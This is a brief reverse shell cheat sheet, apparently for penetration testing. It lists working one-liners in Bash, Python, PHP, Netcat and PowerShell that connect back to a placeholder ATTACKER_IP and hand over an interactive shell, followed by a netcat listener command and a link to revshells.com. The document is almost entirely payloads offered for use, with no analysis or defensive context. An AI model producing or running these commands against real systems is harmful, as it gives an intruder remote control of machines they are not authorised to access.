# Reverse Shell Cheatsheet

## Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

## Python
```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## PHP
```php
php -r 'exec("/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1");'
```

## Netcat
```bash
nc -e /bin/bash ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

## PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$stream.Write([text.encoding]::ASCII.GetBytes($sendback),0,$sendback.Length)}"
```

## Listener
```bash
nc -lvnp PORT
```

> Reference: https://www.revshells.com/